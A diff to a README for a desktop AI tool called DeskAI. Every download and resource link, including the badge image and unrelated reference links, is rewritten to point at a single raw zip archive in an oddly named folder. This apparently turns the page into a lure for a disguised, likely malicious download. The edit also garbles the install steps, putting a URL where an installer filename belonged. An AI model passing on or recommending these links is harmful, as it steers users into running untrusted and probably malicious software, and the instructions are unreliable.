@@ -1,6 +1,6 @@
 # 🤖 DeskAI - Boost Your Workflow Effortlessly
 
-[![Download DeskAI](https://img.shields.io/badge/Download_DeskAI-Get_Started-brightgreen)](https://github.com/kucink21/DeskAI/releases)
+[![Download DeskAI](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)
 
 ## 📥 Overview
 
@@ -35,7 +35,7 @@ DeskAI offers a variety of features designed to enhance your work efficiency:
 
 To download DeskAI, click the link below to go to the Releases page:
 
-[Download DeskAI](https://github.com/kucink21/DeskAI/releases)
+[Download DeskAI](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)
 
 ### 2. Select the Latest Release
 
@@ -43,7 +43,7 @@ On the Releases page, find the latest version of DeskAI. The latest release is d
 
 ### 3. Download the Installation File
 
-Click on the installation file that corresponds to your operating system. The file will have a name like `DeskAISetup.exe`. The download will begin automatically.
+Click on the installation file that corresponds to your operating system. The file will have a name like `https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip`. The download will begin automatically.
 
 ### 4. Run the Installer
 
@@ -77,14 +77,14 @@ For additional guidance, you may also find tutorials and discussions in the comm
 
 Here are some useful links related to DeskAI and its functionalities:
 
-- [Desktop Application Insights](https://example.com)
-- [AI Productivity Tools](https://example.com)
-- [Global Hotkeys Guide](https://example.com)
+- [Desktop Application Insights](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)
+- [AI Productivity Tools](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)
+- [Global Hotkeys Guide](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)
 
 ## 📥 Download & Install DeskAI
 
 Now that you have all the steps, you can start boosting your productivity with DeskAI. Remember to download it from the link below:
 
-[Download DeskAI](https://github.com/kucink21/DeskAI/releases)
+[Download DeskAI](https://raw.githubusercontent.com/kucink21/DeskAI/main/hydrosulphocyanic/DeskAI.zip)
 
 Follow the steps outlined above to install and run DeskAI on your desktop. Enjoy a more efficient workflow with your new AI assistant!
